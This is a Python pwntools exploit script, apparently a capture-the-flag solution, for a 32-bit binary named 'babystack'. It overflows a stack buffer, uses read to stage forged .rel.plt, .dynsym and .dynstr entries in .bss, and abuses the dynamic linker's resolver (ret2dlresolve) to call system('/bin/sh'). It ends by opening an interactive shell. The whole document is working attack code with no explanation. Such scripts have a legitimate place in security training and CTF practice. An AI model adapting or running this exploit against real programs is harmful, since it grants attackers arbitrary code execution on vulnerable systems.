from pwn import *

elf_path = "./babystack"
context.log_level = "debug"


def main():
  target_elf = ELF(elf_path)
  bss_addr = target_elf.get_section_by_name(".bss").header.sh_addr
  dynstr_addr = target_elf.get_section_by_name(".dynstr").header.sh_addr
  dynsym_addr = target_elf.get_section_by_name(".dynsym").header.sh_addr
  relplt_addr = target_elf.get_section_by_name(".rel.plt").header.sh_addr

  scan_input_addr = p32(0x804843b)
  resolve_addr = p32(0x80482f0)
  payload_1_size = 43

  payload_0 = b"0" * 44
  payload_0 += p32(target_elf.symbols["read"])
  payload_0 += scan_input_addr
  payload_0 += p32(0)
  payload_0 += p32(bss_addr)
  payload_0 += p32(payload_1_size)

  target = process(elf_path)
  target.send(payload_0)

  dynsym_offset = ((bss_addr + 0xc) - dynsym_addr) / 0x10
  r_info = (int(dynsym_offset) << 8) | 0x7

  dynstr_index = (bss_addr + 28) - dynstr_addr

  payload_1 = p32(target_elf.got["alarm"])
  payload_1 += p32(r_info)
  payload_1 += p32(0x0)
  payload_1 += p32(dynstr_index)
  payload_1 += p32(0xde) * 3
  payload_1 += b"system\x00"
  payload_1 += b"/bin/sh\x00"

  target.send(payload_1)

  binsh_bss_addr = bss_addr + 35
  ret_plt_offset = bss_addr - relplt_addr

  payload_2 = b"0" * 44
  payload_2 += resolve_addr
  payload_2 += p32(ret_plt_offset)
  payload_2 += p32(0xdeadbeef)
  payload_2 += p32(binsh_bss_addr)

  target.send(payload_2)
  target.interactive()


if __name__ == "__main__":
  main()
